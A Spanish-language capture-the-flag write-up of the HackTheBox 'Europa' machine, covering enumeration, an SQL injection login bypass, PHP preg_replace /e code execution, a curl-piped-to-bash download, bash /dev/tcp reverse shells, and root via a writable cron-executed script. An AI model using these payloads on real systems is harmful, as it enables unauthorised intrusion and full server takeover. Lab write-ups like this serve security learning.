---
layout: single
title: Europa HTB - WriteUp
excerpt: WriteUp de la máquina Europa de HTB.
date: 2023-02-19
classes: wide
header:
  teaser: /assets/images/Europa/Europa.png
  teaser_home_page: true
  icon: /assets/images/Europa/Europa.png
categories:
  - infosec
tags:
  - ctf
  - Linux                                                                                                                                                                                 
  - Writeup
  - Virtual_Hosting                                                                                                                                                                                  
  - SQLI                                                                                                                                                                                     
  - Pre_Replace
  - Crontab
---

Hoy estamos la máquina Europa de HackTheBox.

### Enumeración.

Lo primero que haremos será escanear los puertos de la máquina, para ello usaremos la herramienta nmap.

```bash
❯ nmap -sC -sV -Pn -n -oN Extraction -p22,80,443 10.10.10.22
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2023-02-19 09:17 CET
Nmap scan report for 10.10.10.22
Host is up (0.068s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6b:55:42:0a:f7:06:8c:67:c0:e2:5c:05:db:09:fb:78 (RSA)
|   256 b1:ea:5e:c4:1c:0a:96:9e:93:db:1d:ad:22:50:74:75 (ECDSA)
|_  256 33:1f:16:8d:c0:24:78:5f:5b:f5:6d:7f:f7:b4:f2:e5 (ED25519)
80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
| ssl-cert: Subject: commonName=europacorp.htb/organizationName=EuropaCorp Ltd./stateOrProvinceName=Attica/countryName=GR
| Subject Alternative Name: DNS:www.europacorp.htb, DNS:admin-portal.europacorp.htb
| Not valid before: 2017-04-19T09:06:22
|_Not valid after:  2027-04-17T09:06:22
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Podemos sacar varias cosas de este escaneo:

- En el servidor web que usa SSL podemos ver nombres de dominios. Es posible que se este utilizando Virtual Hosting, voy a añadir los siguientes nombres al /etc/hosts.
	- admin-portal.europacorp.htb
	- europacorp.htb
	
- Un correo de administrador -> admin@europacorp.htb

Ademas he enumerado con gobuster en busqueda de mas subdominios, pero no he encontrado ningunos mas...

### Explotación

Si entramos a admin-portal.europacorp.htb podemos ver una página de incio de sesión. No disponemos de contraseñas... Pasaré la petición POST por Burpsuite para aplicar inyeccciones basicas.

Podemos comprobar que el formulario es vulnerable a SQLI.

![](/assets/images/Europa/burp1.png)

La inyección es error based, podemos comprobar en la respuesta un hash. La aplicación nos esta hasheando la password que introduccimos por el formulario. Podemos saltarnos el panel de login de diferentes formas... En mi caso he usado el siguiente payload:

```r
email=admin@europacorp.htb';--+-&password=
```

Este payload nos devuelve un codigo de estado 302 y la cabecera:

```r
Location: https://admin-portal.europacorp.htb/dashboard.php
```
 
Por lo tanto nos va a redirecccionar a esa página. En ella podemos ver un dashboard que no permite acceder a la gran mayoria de enlaces. Podemos a acceder a uno que lleva a tools.php

Esta tool parece que nos deja generar un archivo de configuración OpenVPN, tenemos un input que nos solicita una direccción IP del host remoto, voy a pasar la petición por Burpsuite.

![](/assets/images/Europa/burp2.png)

En la petición podemos ver un campo pattern, lo que me hace pensar que se está utilizando la función preg_replace() de PHP. Con una simple busqueda en google podemos ver como explotarlo.

```php
payload: index.php?pat=**/a/e**&rep=**phpinfo();**&sub=**abc**
```

preg_replace tiene una serie de modificadores a la hora de buscar expresiones, entre ellas un modificador /e el cual es capaz de interpretar código PHP. Si se ha pasado esto por alto a la hora de crear la aplicación podemos intentar explotarlo.

En nuestro caso el payload quedaria así:

```php
pattern=/ip_address/e&ipaddress=phpinfo();SNIP...
```

En mi caso no quiero mostrar información sobre PHP quiere ejecutar comandos a nivel de sistema

```php
pattern=/ip_address/e&ipaddress=system('id');SNIP...
```

Si mandamos ese payload y miramos la respuesta podemos observar que donde se haría la sustitución de la dirección IP ahora vemos el usuario que esta  ejecutanto el servidor web.

![](/assets/images/Europa/burp3.png)

Ahora intentaré establecer una Revshell. Para ello usare el siguiente payload:

```php
pattern=/ip_address/e&ipaddress=system('curl+http://10.10.16.4/shell.sh|bash')
```

Archivo shell.sh

```bash
bash -i >& /dev/tcp/10.10.16.4/443 0>&1
```

### Enumeración del sistema

Una vez enviado el payload, si revisamos nuestro listener, podemos ver que tenemos una shell. Por comodidad la haré interactiva.

```bash
Pasos
	1- script -c bash /dev/null
	2- ctrl + z
	3- stty raw -echo ;fg
	4- export TERM=xterm
	5- export SHELL=bash
	6- stty rows x columns x
```

Si enumeramos el sistema podemos ver que hay una tarea cron en /etc/crotab

```bash
www-data@europa:/home/john$ cat /etc/crontab 
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * *       root    /var/www/cronjobs/clearlogs
```

Podemos ver que la esta ejecutando root. Si miramos lo que contiene el script podemos observar que es un script en php que ejecuta un archivo .sh.

```php
#!/usr/bin/php
<?php
$file = '/var/www/admin/logs/access.log';
file_put_contents($file, '');
exec('/var/www/cmd/logcleared.sh');
?>
```

### Explotacíon sistema

Si intentamos leerlo podemos ver que no existe, por lo tanto, vamos a comprobar que tengamos permisos de escritura en /var/www/cmd y crearemos un script en en bash para ganar una shell como root.

Usaré el mismo payload que antes (recuerda darle permsiso de ejecución):

```bash
#!/bin/bash
bash -i >& /dev/tcp/10.10.16.4/443 0>&1
```

Si esperamos un rato podemos ver que nuestro listener tiene una shell como root.

```bash
❯ nc -lvvp 443
listening on [any] 443 ...
connect to [10.10.16.4] from admin-portal.europacorp.htb [10.10.10.22] 44454
bash: cannot set terminal process group (2331): Inappropriate ioctl for device
bash: no job control in this shell
root@europa:~#
```


¡Espero que te haya servido!


